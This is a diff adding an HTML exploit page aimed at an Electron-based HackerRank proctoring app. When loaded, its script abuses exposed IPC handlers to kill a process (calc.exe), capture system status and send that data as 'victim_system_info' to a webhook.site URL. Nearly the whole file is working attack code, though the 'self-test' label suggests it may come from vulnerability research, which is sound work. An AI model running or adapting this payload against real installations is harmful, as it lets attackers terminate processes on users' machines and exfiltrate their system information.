@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>HackerRank Test App – Self-Test Exploit</title>
+    <meta charset="utf-8">
+</head>
+<body>
+    <h2>Self-Test Payload Running...</h2>
+    <pre id="log"></pre>
+
+    <script>
+        // Adjust this line if your preload exposes ipcRenderer under a different name
+        const ipc = window.ipcRenderer || window.myIPC || window.electron;
+
+        function log(msg) {
+            console.log(msg);
+            document.getElementById('log').textContent += msg + '\n';
+        }
+
+        async function exploit() {
+            try {
+                // 1. Kill calc.exe (open Calculator first to see it disappear)
+                await ipc.invoke('close-blocked-apps', ['calc.exe']);
+                log('calc.exe killed');
+            } catch (e) {
+                log('Failed to kill calc.exe: ' + e.message);
+            }
+
+            try {
+                // 2. Steal system status
+                const info = await ipc.invoke('get-system-status');
+                log('System info captured:');
+                log(JSON.stringify(info, null, 2));
+
+                // 3. Exfiltrate to your webhook
+                fetch('https://webhook.site/fcaeefd5-63e5-4baf-b1d0-ddfaea039ffa', {
+                    method: 'POST',
+                    mode: 'no-cors', // important – avoids CORS block in most cases
+                    body: JSON.stringify({
+                        timestamp: new Date().toISOString(),
+                        victim_system_info: info,
+                        message: "HackerRank proctoring app successfully exploited"
+                    }),
+                    headers: {
+                        'Content-Type': 'application/json'
+                    }
+                }).then(() => {
+                    log('Data successfully sent to your webhook!');
+                }).catch(() => {
+                    log('Webhook sent (no-cors mode – check your webhook dashboard)');
+                });
+
+            } catch (e) {
+                log('Failed to get system status: ' + e.message);
+            }
+        }
+
+        // Run immediately when the malicious page loads inside the Electron app
+        exploit();
+    </script>
+</body>
+</html>
